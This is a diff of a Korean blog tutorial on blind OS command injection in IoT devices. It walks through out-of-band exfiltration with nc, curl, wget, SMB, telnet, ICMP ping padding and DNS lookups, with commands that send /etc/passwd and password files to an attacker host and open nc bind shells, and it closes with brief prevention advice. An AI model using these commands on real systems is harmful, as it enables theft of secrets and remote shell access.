@@ -36,6 +36,7 @@ categories: IoT system persu
 지금부터는 다양한 명령어를 통해 Blind OS Command Injection에 대해 알아 보겠다.
 
 1. NetCat (NC)
+
 NC는 TCP, UDP을 통해 네트워크 연결을 가능하게 하며, 데이터를 읽고 쓰기가 가능한 명령어다.
 
 - 사용법 : https://en.wikipedia.org/wiki/Netcat
@@ -64,6 +65,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 이렇듯 NC를 통해 특정한 파일을 읽을 수 있으며, 리버스 쉘을 통해 쉘에 접근 할 수 있다.
 
 2. cURL
+
 cURL은 다양한 프로토콜을 사용하여 데이터를 전송하는 라이브러리 및 명령 줄 도구이며 데이터 추출을위한 매우 유용한 도구다. 취약한 서버에 cURL이 있으면 악의적인 웹 서버에 파일을 POST하거나 FTP / SCP / TFTP / TELNET 등의 프로토콜을 사용하여 파일을 전송할 수 있다.
 
 - 사용법 : https://en.wikipedia.org/wiki/CURL
@@ -77,12 +79,15 @@ cURL은 다양한 프로토콜을 사용하여 데이터를 전송하는 라이�
 - curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{password}
 
 <img src="{{ site.url }}/images/2017-03-12/five.png" style="display: block; margin: auto;">
+
 위 명령은 -T 옵션을 이용하여, 공격자의 ftp 서버에 접근하여 file을 전송하는 명령이다.
 
 솔직히 cURL은 평소에 잘 사용하지 않는 명령어라 옵션에 대한 정리 및 이해가 필요하다...
 
 3. WGET
+
 Wget은 웹에서 파일을 비 대화식으로 다운로드 할 때 일반적으로 사용되는 도구. 특히 사용자 정의 헤더 및 POST 요청을 할 수 있다.
+
 - 사용법 : https://en.wikipedia.org/wiki/Wget
 - wget –header=”EVIL:$(cat /data/secret/password.txt)”http://xxx.xxx.xxx:xxx
 - –header=’name:value’ : HTTP Request 메세지 전송 시 특정 헤더에 value 추가하는 옵션
@@ -92,6 +97,7 @@ Wget은 웹에서 파일을 비 대화식으로 다운로드 할 때 일반적�
 위 그림처럼 명령어 전송 시 서버측 로그를 보게 되면, header에 시스템 파일이 노출되는 것을 알 수 있다.
 
 추가적으로 사용할 수 있는 명령어는 아래와 같다.
+
 - wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx
 
 <img src="{{ site.url }}/images/2017-03-12/seven.png" style="display: block; margin: auto;">
@@ -101,12 +107,15 @@ Wget은 웹에서 파일을 비 대화식으로 다운로드 할 때 일반적�
 <img src="{{ site.url }}/images/2017-03-12/eight.png" style="display: block; margin: auto;">
 
 - wget –post-file trophy.php http://xxx.xxx.xxx.xxx:xxxx
+
 특정 파일을 post body 영역에 전송하는 명령어
 
 <img src="{{ site.url }}/images/2017-03-12/nine.png" style="display: block; margin: auto;">
 
 4. SMB
+
 Windows 운영체제를 사용하는 PC에서 Linux 또는 UNIX 서버에 접속하여 파일이나 프린터를 공유하여 사용할 수 있도록 해 주는 소프트웨어이다.
+
 - 사용법 : https://ko.wikipedia.org/wiki/%EC%82%BC%EB%B0%94_
 - net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {password} && copy {File to Copy} h:\{filename}.txt
 
@@ -115,7 +124,9 @@ Windows 운영체제를 사용하는 PC에서 Linux 또는 UNIX 서버에 접속
 잘 사용하지 않지만, 특정 명령어를 사용할 수 없고 SMB 프로토콜이 활성화 되어 있는 경우 유용하게 쓰일 수 있다.
 
 5. TELNET
+
 TELNET 프로토콜은 원격에서 쉘에 접근할 수 있는 서비스를 제공한다. 23번 Default Port를 사용하고 있으며, 평문 전송을 통해 데이터를 전달 하게 된다. (대부분 한번 쯤 써본 서비스...)
+
 - 사용법 : https://en.wikipedia.org/wiki/Telnet
 - telnet xxx.xxx.xxx.xxx {port} < {file to transfer}
 
@@ -124,7 +135,9 @@ TELNET 프로토콜은 원격에서 쉘에 접근할 수 있는 서비스를 제
 공격자가 NC 를 이용해 특정 포트를 오픈하고 있을 시 위 명령어를 통해 Telnet 서비스에 연결하게 되지만 실제로는 지정한 파일이 입력되어 공격자 PC에는 지정한 파일의 정보가 노출되는 것을 알 수 있다.
 
 6. ICMP
+
 ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, management하기 위해 사용되는 서비스다. 보통 우리가 자주 쓰는 ping 명령어 또한 ICMP 메세지를 통해 전송되는 것이며, 위 내용과는 조금 다른 방식으로 사용된다.
+
 - cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done
 
 <img src="{{ site.url }}/images/2017-03-12/13.png" style="display: block; margin: auto;">
@@ -136,15 +149,17 @@ ICMP 프로토콜은 목적지 IP에 대해 상태를 점검 하거나, manageme
 그 옵션이 바로 -p 옵션이며, 최대 16 개의 "패드"바이트를 지정할 수 있다. 여기서 공격자가 추출하고자하는 데이터를 저장하는 것이다.
 
 7. DNS
+
 DNS 프로토콜은 Domain name에 해당하는 IP 주소를 DNS 서버에 요청하여, 목적지 URL의 IP를 알아 오는 역할이다.
+
 - cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done
 
 <img src="{{ site.url }}/images/2017-03-12/15.png" style="display: block; margin: auto;">
 
 DNS 프로토콜은 해당 URL의 IP를 서버에 요청시 쿼리를 날리게 되는데 위 그림에서 사용한 방식은 요청할 URL에 파일의 값으로 사용한다는 내용이다. 충분히 가능한 얘기이며, 이 또한 프로토콜의 특성을 이용하는 방법이다.
 
-
 8. 추가 내용
+
 - nc -l -p 9090 -e cmd.exe (Windows)
 - nc -l -p 9090 -e /bin/bash (*nix)
 
@@ -158,6 +173,7 @@ uid=501(persu)
 ```
 
 ### Blind OS Command Injection Prevention
+
 OS Command Injection 공격은 IoT 디바이스에서 많이 발견되는 취약점이다. 이를 방어 하기 위한 방법은 아래와 같다.
 
 - 시스템 명령어 사용 시 상수 값을 통한 입력값 제한
